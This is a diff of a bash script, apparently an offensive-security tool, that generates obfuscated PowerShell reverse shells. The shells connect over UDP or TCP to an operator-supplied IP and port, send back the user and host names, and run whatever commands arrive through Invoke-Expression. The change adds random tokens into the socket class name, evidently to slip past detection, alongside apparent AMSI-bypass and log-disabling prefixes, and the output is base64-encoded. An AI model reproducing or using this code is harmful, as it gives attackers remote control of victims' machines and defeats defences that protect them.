@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.1"
+version="1.5.2"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -611,7 +611,7 @@ returndata=$(openssl rand -hex $(shuf -i 1-11 -n1))
 x=$(openssl rand -hex $(shuf -i 1-11 -n1))
 result=$(openssl rand -hex $(shuf -i 1-11 -n1))
 wevutil=$(shuf -er -n20  {A..Z} {a..z} | tr -d '\n')
-
+placeh=$(openssl rand -hex $(shuf -i 1-11 -n1))
 
 
 
@@ -684,11 +684,11 @@ if [[ $4 == "udp" ]]
 then
 #UDP
 
-shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
 else
     
 #TCP
-   shell="$AMSIb$disableLog$fAMSIb$func\$$client = New-Object Net.Sockets.TCPClient('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+   shell="$AMSIb$disableLog$fAMSIb$func\$$client = New-Object Net.\$$placeh\"Sockets.TCPClient\"('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
